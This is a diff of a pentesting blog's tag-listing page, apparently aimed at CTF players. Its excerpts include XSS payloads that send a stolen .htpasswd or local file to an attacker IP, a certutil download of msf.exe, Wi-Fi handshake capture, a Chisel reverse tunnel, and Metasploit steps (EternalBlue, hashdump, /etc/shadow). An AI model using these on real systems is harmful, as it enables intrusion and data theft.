@@ -173,6 +173,22 @@
 
 <article class="post-entry tag-entry"> 
   <header class="entry-header">
+    <h2 class="entry-hint-parent">Tutorial: Downloading Files from Linux to Windows Using Windows CLI
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Method 1: Using an HTTP Server Step 1: Start an HTTP server on Linux Open a terminal on your Linux machine and run:
+sudo python3 -m http.server 80 Step 2: Download the file using certutil on Windows Open Command Prompt or PowerShell on your Windows machine and run:
+certutil.exe -urlcache -split -f &#34;http://10.10.14.7/msf.exe&#34; Method 2: Using Invoke-WebRequest Step 1: Start an HTTP server on Linux Same as Step 1 in Method 1.
+Step 2: Download the file using Invoke-WebRequest on Windows Open PowerShell on your Windows machine and run:
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>2 min</span></footer>
+  <a class="entry-link" aria-label="post link to Tutorial: Downloading Files from Linux to Windows Using Windows CLI" href="http://localhost:1313/posts/tipsandtricks/cheatsheets/windows-native-shell/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
     <h2 class="entry-hint-parent">Tutorial: String Manipulation in Perl with s///, y///, and s///g
     </h2>
   </header>
@@ -191,6 +207,19 @@ text = &#34;Hello John. John is a friend.&#34;; regex = s/John/Doe/; # Result: &
 
 <article class="post-entry tag-entry"> 
   <header class="entry-header">
+    <h2 class="entry-hint-parent">Wi-Fi Handshake Capture Guide using aircrack-ng Tools
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p> 🔍 1. Scan Available WiFi Networks 🌐 Scan all nearby WiFi networks sudo airodump-ng mon0 📶 Scan only 2.4 GHz networks (802.11b/g) sudo airodump-ng --band bg mon0 📡 Scan only 5 GHz networks (802.11a) sudo airodump-ng --band a mon0 📋 Band Option Summary --band a → 5 GHz (802.11a) --band b → 2.4 GHz (802.11b) --band g → 2.4 GHz (802.11g) --band bg → All 2.4 GHz (recommended) --band abg → Both 2.4 GHz and 5 GHz 🎯 2. Capture WPA/WPA2 Handshake 🎯 Start listening on target AP # Replace &lt;channel&gt;, &lt;BSSID&gt;, and &lt;output_filename&gt; sudo airodump-ng -c &lt;channel&gt; --bssid &lt;BSSID&gt; -w &lt;output_filename&gt; mon0 Example
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>2 min</span></footer>
+  <a class="entry-link" aria-label="post link to Wi-Fi Handshake Capture Guide using aircrack-ng Tools" href="http://localhost:1313/posts/tipsandtricks/cheatsheets/wi-fi-handshake-capture-guide-using-aircrack-ng-tools/"></a>
+</article>
+
+<article class="post-entry tag-entry"> 
+  <header class="entry-header">
     <h2 class="entry-hint-parent">XSS File Stealing Cheat Sheet
     </h2>
   </header>
@@ -198,27 +227,12 @@ text = &#34;Hello John. John is a friend.&#34;; regex = s/John/Doe/; # Result: &
     <p> 1. Steal File Content Using Inline XSS Script (HTML) &lt;script&gt; fetch(&#34;http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd&#34;) .then(response =&gt; response.text()) .then(data =&gt; { fetch(&#34;http://10.10.14.228/?data=&#34; &#43; encodeURIComponent(data)); }) .catch(error =&gt; console.error(&#34;Error fetching the messages:&#34;, error)); &lt;/script&gt; Explanation: This script tries to read the .htpasswd file from a vulnerable server using a local file inclusion (LFI) or file read vulnerability in the URL parameter file. Then, it sends the stolen file content back to your attacker server (10.10.14.228) using an HTTP request with the data URL-encoded. Works in XSS vulnerable pages where you can inject JS. How to use: Inject this script into an XSS vulnerable parameter or stored XSS vector. Make sure your attacker machine (10.10.14.228) is ready to receive GET requests and log the data parameter. Example listener (using nc or a simple Python HTTP server) to capture data: nc -lvnp 80 # or python3 -m http.server 80 2. External JS File to Steal File Content via XSS (JavaScript) // Usage: // Spawn python HTTP server on attacker box: python3 -m http.server 1212 // Inject in vulnerable page: &lt;script src=&#34;http://10.9.179.230:1212/steal_page_content_xss.js&#34;&gt;&lt;/script&gt; var url = &#34;http://127.0.0.1/dir/pass.txt&#34;; // Target file on victim var attacker = &#34;http://10.9.179.230:1212/steal_page_content_xss.js&#34;; var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function() { if (xhr.readyState == XMLHttpRequest.DONE) { // send base64 encoded stolen content to attacker server fetch(attacker &#43; &#34;?&#34; &#43; encodeURI(btoa(xhr.responseText))) } } xhr.open(&#39;GET&#39;, url, true); xhr.send(null); Explanation: This script fetches a local file on the victim machine (http://127.0.0.1/dir/pass.txt) via the victim’s browser. When the file is fully loaded (DONE), it encodes the content in Base64 (btoa) to safely transmit binary or special characters. Then sends this encoded content back to attacker server by requesting the script file with data as query string (?data=...). Requires you to host this script on your attacker machine (10.9.179.230) and have an HTTP server running on port 1212. How to use: Start HTTP server on attacker box: python3 -m http.server 1212 Inject &lt;script src=&#34;http://10.9.179.230:1212/steal_page_content_xss.js&#34;&gt;&lt;/script&gt; into an XSS vulnerable page. Monitor requests on your attacker server to capture the Base64 encoded file contents in the URL. Decode captured Base64 content: echo &#34;base64_encoded_string&#34; | base64 -d &gt; stolen_file.txt Summary Notes: These methods depend on the target browser having access to local files via URL paths (like 127.0.0.1) or vulnerable parameters (LFI). Base64 encoding helps send files safely in GET requests. Must have control over attacker server to catch stolen data. Use during CTF challenges, penetration testing, or in controlled environments. Always check the same-origin policy and CORS restrictions which may block requests in real-world targets. </p>
   </div>
   <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>2 min</span></footer>
-  <a class="entry-link" aria-label="post link to XSS File Stealing Cheat Sheet" href="http://localhost:1313/posts/tipsandtricks/webvulnerability/xss-file-stealing-cheat-sheet/"></a>
+  <a class="entry-link" aria-label="post link to XSS File Stealing Cheat Sheet" href="http://localhost:1313/posts/penetration-testing/webvulnerability/xss-file-stealing-cheat-sheet/"></a>
 </article>
 
 <article class="post-entry tag-entry"> 
   <header class="entry-header">
-    <h2 class="entry-hint-parent">🛠️ Chisel Port Forwarding Guide
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p> 🧠 What is Chisel? Chisel is a fast TCP/UDP tunnel over HTTP, useful for port forwarding and pivoting, especially during red teaming or CTFs.
-🔥 Attacker Machine Setup (Chisel Server) Start Chisel in reverse mode on the attacker machine:
-./chisel_1.5.1 server -p 9005 --reverse -p 9005: Listen on port 9005 --reverse: Accept reverse port forwarding connections 🎯 Target Machine Setup (Chisel Client) Forward all traffic to attacker: ./chisel client 10.10.14.19:9005 R:socks This sets up a SOCKS proxy from the target to the attacker’s Chisel server
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>1 min</span></footer>
-  <a class="entry-link" aria-label="post link to 🛠️ Chisel Port Forwarding Guide" href="http://localhost:1313/posts/tipsandtricks/cheatsheets/%EF%B8%8F-chisel-port-forwarding-guide/"></a>
-</article>
-
-<article class="post-entry tag-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">🛡️ XSS Payload Cheat Sheet
+    <h2 class="entry-hint-parent">XSS Payload Cheat Sheet
     </h2>
   </header>
   <div class="entry-content">
@@ -226,20 +240,7 @@ text = &#34;Hello John. John is a friend.&#34;; regex = s/John/Doe/; # Result: &
 </p>
   </div>
   <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>1 min</span></footer>
-  <a class="entry-link" aria-label="post link to 🛡️ XSS Payload Cheat Sheet" href="http://localhost:1313/posts/tipsandtricks/webvulnerability/xss_payload/"></a>
-</article>
-
-<article class="post-entry tag-entry"> 
-  <header class="entry-header">
-    <h2 class="entry-hint-parent">🧨 Metasploit Practical Guide (for Beginners and CTF use)
-    </h2>
-  </header>
-  <div class="entry-content">
-    <p>🌐 1.Start Metasploit Console sudo systemctl start postgresql msfconsole Initialize the Metasploit Database (First Time Only) msfdb init 🔍 2. Scanning Targets Quick Target Discovery nmap -sn 10.10.10.0/24 Full Port &#43; Version Scan (Integrated with Metasploit DB) db_nmap -sC -sV -O -Pn 10.10.10.129 View Discovered Hosts &amp; Services hosts services 🪡 3. Exploit Search and Module Use Search by service name or CVE search vsftpd search type:exploit name:smb Load a Module use exploit/unix/ftp/vsftpd_234_backdoor Explore Module Info info # Shows full module details (author, platform, options, etc) show options # Required &#43; optional settings (RHOSTS, LHOST, etc) show advanced # Advanced options like threads, timeouts, proxies show payloads # Compatible payloads for this exploit 💡 4. Linux Exploitation Workflow Example: FTP Backdoor use exploit/unix/ftp/vsftpd_234_backdoor set RHOSTS 10.10.10.129 set payload cmd/unix/interact run If Shell is Basic: Upgrade python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; Or Use Web Delivery use exploit/multi/script/web_delivery set payload linux/x86/meterpreter/reverse_tcp set LHOST &lt;your_ip&gt; set LPORT 4444 run Post-Exploitation (Linux) sessions -i 1 getuid sysinfo Enumerate OS and Configs run post/linux/gather/enum_os run post/linux/gather/enum_configs Dump Password Hashes download /etc/passwd download /etc/shadow john shadow --wordlist=/usr/share/wordlists/rockyou.txt Local Exploit Suggestion run post/multi/recon/local_exploit_suggester Example Local Root Exploit use exploit/linux/local/dirty_cow set SESSION 1 run Confirm Root id whoami 💻 5. Windows Exploitation Workflow Example: EternalBlue use exploit/windows/smb/ms17_010_eternalblue set RHOSTS 10.10.10.130 set LHOST &lt;your_ip&gt; set payload windows/x64/meterpreter/reverse_tcp run Session Handling sessions sessions -i 1 sysinfo getuid Post-Exploitation (Windows) Dump Hashes hashdump load kiwi kiwi_cmd &#34;lsadump::sam&#34; Process Migration ps migrate &lt;pid&gt; getpid Privilege Escalation getsystem Or use:
-...</p>
-  </div>
-  <footer class="entry-footer"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>2 min</span></footer>
-  <a class="entry-link" aria-label="post link to 🧨 Metasploit Practical Guide (for Beginners and CTF use)" href="http://localhost:1313/posts/tipsandtricks/cheatsheets/metasploit-practical-guide-for-beginners-and-ctf-use/"></a>
+  <a class="entry-link" aria-label="post link to XSS Payload Cheat Sheet" href="http://localhost:1313/posts/penetration-testing/webvulnerability/xss_payload/"></a>
 </article>
 
 <article class="post-entry tag-entry"> 
@@ -289,7 +290,9 @@ text = &#34;Hello John. John is a friend.&#34;; regex = s/John/Doe/; # Result: &
 
     <section>
         <h2>Trending Tags</h2>
-                                                                                                                                                                                    
+              
+        <a class="sidebar-tag" href="http://localhost:1313/tags/overthewire/"> OverTheWire </a>
+                                                                                                                                                                                                                                                            
         <a class="sidebar-tag" href="http://localhost:1313/tags/blog/"> Blog </a>
                                                                                                                                                                    
     </section>
